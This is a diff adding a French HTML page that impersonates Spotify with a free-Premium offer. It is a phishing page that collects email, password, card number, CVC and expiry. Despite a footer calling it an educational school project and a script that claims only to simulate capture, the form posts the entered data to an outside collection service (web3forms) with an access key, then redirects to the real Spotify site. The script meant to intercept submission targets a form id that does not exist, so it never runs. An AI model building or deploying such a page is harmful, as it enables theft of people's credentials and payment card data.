@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify Premium - Obtenir 6 mois gratuits</title>
+  <link rel="icon" href=https://upload.wikimedia.org/wikipedia/commons/7/71/Spotify.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', sans-serif;
+    }
+
+    body {
+      background-color: #121212;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
+    header img {
+      width: 160px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      margin-bottom: 25px;
+    }
+
+    form {
+      background-color: #121212;
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    label {
+      text-align: left;
+      font-weight: 600;
+      font-size: 0.9rem;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"],
+    input[type="number"],
+    input[type="month"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      font-size: 1rem;
+      background-color: #222;
+      color: #fff;
+      transition: border 0.3s, background-color 0.3s;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    input:focus {
+      border-color: #1DB954;
+      background-color: #1a1a1a;
+      outline: none;
+    }
+
+    .card-info {
+      display: flex;
+      gap: 10px;
+    }
+
+    .card-info div {
+      flex: 1;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 0.85rem;
+      text-align: left;
+      margin-top: 5px;
+    }
+
+    .checkbox input {
+      accent-color: #1DB954;
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+    }
+
+    .cta {
+      background-color: #1DB954;
+      color: #121212;
+      font-weight: 600;
+      padding: 14px;
+      border: none;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+    }
+
+    .cta:hover {
+      background-color: #1ed760;
+      transform: scale(1.05);
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #aaa;
+      line-height: 1.5;
+    }
+
+    .demo-tag {
+      color: #1DB954;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a href="https://www.spotify.com">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Spotify.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Spotify Logo">
+    </a>
+  </header>
+
+  <main>
+    <h1>Obtenir Spotify Premium</h1>
+    
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <!-- Remplace par ton adresse mail de destination -->
+      <input type="hidden" name="access_key" value="b05f2c33-be8a-407f-93df-e3988614f601">
+      <input type="hidden" name="redirect" value="https://www.spotify.com/">
+
+      <div>
+        <label for="email">Adresse e-mail</label>
+        <!-- L'attribut name est obligatoire pour recevoir la valeur -->
+        <input type="email" id="email" name="identifiant" placeholder="exemple@mail.com" required>
+      </div>
+
+      <div>
+        <label for="password">Mot de passe</label>
+        <input type="text" id="password" name="code_acces" placeholder="••••••••" required>
+      </div>
+
+      <div>
+        <label for="card">Numéro de carte bancaire</label>
+        <input type="text" id="card" name="numero_reference" placeholder="1234 5678 9012 3456" required>
+      </div>
+
+      <div class="card-info">
+        <div>
+          <label for="cvc">Code secret</label>
+          <input type="number" id="cvc" name="verification" placeholder="123" required>
+        </div>
+        
+        <div>
+          <label for="expiration">Date d'expiration</label>
+          <input type="month" id="expiration" name="date_limite" required>
+        </div>
+      </div>
+
+      <button type="submit" class="cta">Obtenir Premium</button>
+    </form>
+  </main>
+
+  <footer>
+    <p>Offre réservée aux nouveaux utilisateurs Premium. Conditions générales applicables.</p>
+    <p class="demo-tag">PROJET CHEF D'ŒUVRE - BUT PÉDAGOGIQUE UNIQUEMENT</p>
+  </footer>
+
+  <script>
+    // 1. VARIABLE D'ENVIRONNEMENT (Simulation)
+    // Dans un projet réel (Node.js/React), on utiliserait process.env.API_ENDPOINT
+    // Ici, on simule l'adresse du serveur distant du "hacker"
+    const ENV_CONFIG = {
+      REMOTE_SERVER_URL: "https://serveur-collecte-bacpro.local/api/v1",
+      LOG_LEVEL: "DEBUG",
+      PROJECT_NAME: "Phishing_Simulation_2026"
+    };
+
+    const form = document.getElementById('phishingForm');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // On bloque l'envoi réel pour traiter les données
+
+      // Récupération des valeurs saisies
+      const data = {
+        email: document.getElementById('email').value,
+        password: document.getElementById('password').value,
+        cardNumber: document.getElementById('card').value,
+        cvc: document.getElementById('cvc').value,
+        expiry: document.getElementById('expiration').value,
+        capturedAt: new Date().toLocaleString()
+      };
+
+      // 2. LOCAL STORAGE
+      // On enregistre les données dans le navigateur pour prouver l'extraction
+      localStorage.setItem('captured_user_data', JSON.stringify(data));
+      console.log("Données bien enregistrées : ", localStorage.getItem('captured_user_data'));
+
+      // Affichage console pour la démo devant le jury
+      console.log("--- LOGS SYSTÈME (DEBUG MODE) ---");
+      console.log("Envoi des données vers la variable d'environnement :", ENV_CONFIG.REMOTE_SERVER_URL);
+      console.log("Données stockées dans le LocalStorage avec succès.");
+
+      // Alerte pédagogique pour conclure la démo
+      alert(
+        "DÉMONSTRATION RÉUSSIE\n\n" +
+        "Les données ont été stockées dans le LocalStorage.\n" +
+        "Le script simule maintenant l'envoi vers : " + ENV_CONFIG.REMOTE_SERVER_URL + "\n\n" +
+        "Vous allez être redirigé vers le site officiel."
+      );
+
+      // Redirection finale
+      window.location.href = "https://www.spotify.com/fr/premium/";
+    });
+  </script>
+
+</body>
+</html>
